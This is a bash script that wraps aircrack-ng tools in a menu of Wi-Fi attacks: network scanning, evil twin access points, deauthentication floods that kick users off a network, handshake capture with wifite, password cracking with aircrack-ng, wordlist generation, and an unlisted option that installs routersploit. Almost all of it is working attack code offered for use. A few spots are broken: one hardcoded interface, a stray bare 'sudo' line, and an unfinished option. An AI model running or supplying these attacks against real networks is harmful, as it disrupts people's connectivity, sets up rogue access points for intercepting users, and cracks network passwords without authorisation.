#! /bin/bash

echo "
                                                                               
                            @@@@@@@@@@@@@@@@@@@@@@@@@                           
                      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(                     
                  @@@@@@@@@@@/                     @@@@@@@@@@@                  
               @@@@@@@@@                                 @@@@@@@@#              
               @@@@@@          @@@@@@@@@@@@@@@@@@@          @@@@@@              
                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                         
                       @@@@@@@@@@               @@@@@@@@@@                      
                       @@@@@                         @@@@@                      
                                   @@@@@@@@@@@                                  
                              @@@@@@@@@@@@@@@@@@@@@                             
                              @@@@@@        ,@@@@@@                             
                                                                                
                                                                                
                                     @@@@@@@                                    
                                    @@@@@@@@@                                   
                                     @@@@@@@                                    
                                                                                
                                                                                
                                                                                
                                                                                "

echo "This is the section for Wifi-related attacks, First off enter your wireless interface, ex:*wlan0*"
read INTER
sleep 1
echo "Choose an attack"
echo "/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/"
echo "-------------------------------"
echo "Simple Wifi scan(1)"
echo "-------------------------------"
echo "Evil Twin attack(2)"
echo "-------------------------------"
echo "Deauth attack(3)"
echo "-------------------------------"
echo "Deauth attack+Capture handshake(4)"
echo "-------------------------------"
echo "Deauth attack+Evil Twin(5)"
echo "-------------------------------"
echo "Deauth attack+capture handshake+crack handshake(6)"
echo "-------------------------------"
echo "Create password wordlist(7)"
 echo "-------------------------------"
read ATTACKTY

if [[ $ATTACKTY == '1' ]]
then
    sudo airodump-ng $INTER
fi

if [[ $ATTACKTY == '2' ]]
then
    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
    sleep 3
    sudo airodump-ng $INTER
    echo "Enter target's BSSID"
    echo "Enter Evil Twin's Name"
    read BSSID
    read NAMEW
    sudo airbase-ng -a $BSSID  -e $NAMEW -c 6 wlan0
fi
    

if [[ $ATTACKTY == '3' ]]
then
    echo "This will launch a Deauthentication attack which will kick users out of a wifi network"
    sleep 1
    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
    sudo airodump-ng $INTER
    echo "Enter target's BSSID"
    read BSSID3
    sudo aireplay-ng --deauth 1000 -a $BSSID3 $INTER
fi
if [[ $ATTACKTY == '4' ]]
then  
    echo "This is still under construction, sorry!"
fi


if [[ $ATTACKTY == '5' ]]
then
    echo "This will launch a Deauth attack, then create an Evil Twin of a wifi"
    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
    sleep 2
    sudo airodump-ng $INTER
    echo "Enter target's BSSID"
    echo "Enter Evil twin's wifi name(highly recommend using the real wifi name)"
    read BSSID5
    read EVNAME
    sudo aireplay-ng --deauth 1000 -a $BSSID5 $INTER
    sleep 1
    sudo 
    sudo airbase-ng -a $BSSID5  -e $EVNAME -c 6 $INTER
fi


if [[ $ATTACKTY == '6' ]] 
then
    echo "This will launch a Deauthentication attack which will kick users out of a wifi network, then it'll capture the handshake using wifite, afterwards it'll use aircrack-ng to crack it"
    sleep 1
    konsole -e sudo wifite
    sleep 1
    echo "Insert location and name of the captured handshake"
    read HANDLOC
    echo "Insert location and name of the wordlist you want to utilize"
    read WORDLOC
    sudo aircrack-ng $HANDLOC -w $WORDLOC
fi

if [[ $ATTACKTY == '7' ]]
then
    echo "A new terminal will be opened, please fill the inputs in it"
    konsole -e ./wordlistbases.sh
fi 

if [[ $ATTACKTY == '8' ]]
then
    echo "This will launch a tool called routersploit"
    sudo apt install routersploit
    routersploit
fi
